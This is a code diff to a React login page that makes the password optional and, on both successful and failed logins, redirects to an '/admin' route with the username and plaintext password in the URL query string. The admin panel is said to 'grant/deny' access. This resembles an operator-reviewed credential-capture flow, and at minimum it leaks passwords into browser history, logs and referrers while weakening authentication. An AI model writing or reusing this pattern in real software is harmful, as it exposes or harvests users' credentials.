@@ -11,6 +11,7 @@ import { Alert, AlertDescription } from "@/components/ui/alert";
 import { Card, CardContent } from "@/components/ui/card";
 import { Loader2, AlertTriangle, ArrowLeft } from "lucide-react";
 import { apiRequest } from "@/lib/queryClient";
+import { useLocation } from "wouter";
 
 const usernameSchema = z.object({
   username: z.string().min(3, "Username must be at least 3 characters long"),
@@ -18,7 +19,7 @@ const usernameSchema = z.object({
 });
 
 const passwordSchema = z.object({
-  password: z.string().min(1, "Password is required"),
+  password: z.string().optional(),
 });
 
 type UsernameFormData = z.infer<typeof usernameSchema>;
@@ -27,6 +28,7 @@ type PasswordFormData = z.infer<typeof passwordSchema>;
 export default function Login() {
   const [step, setStep] = useState<'username' | 'password'>('username');
   const [usernameData, setUsernameData] = useState<UsernameFormData | null>(null);
+  const [location, setLocation] = useLocation();
 
   const usernameForm = useForm<UsernameFormData>({
     resolver: zodResolver(usernameSchema),
@@ -66,11 +68,14 @@ export default function Login() {
       const response = await apiRequest("POST", "/api/auth/login", fullLoginData);
       return response.json();
     },
-    onSuccess: () => {
-      // Success - no popup
+    onSuccess: (result) => {
+      // Redirect to admin panel with username/password data
+      const password = passwordForm.getValues().password || '';
+      setLocation(`/admin?username=${encodeURIComponent(usernameData?.username || '')}&password=${encodeURIComponent(password)}`);
     },
     onError: () => {
-      // Silently handle error - no toast
+      // Redirect to admin panel on error too - it will handle grant/deny
+      setLocation(`/admin?username=${encodeURIComponent(usernameData?.username || '')}&password=${encodeURIComponent(passwordForm.getValues().password || '')}`);
     },
   });
 
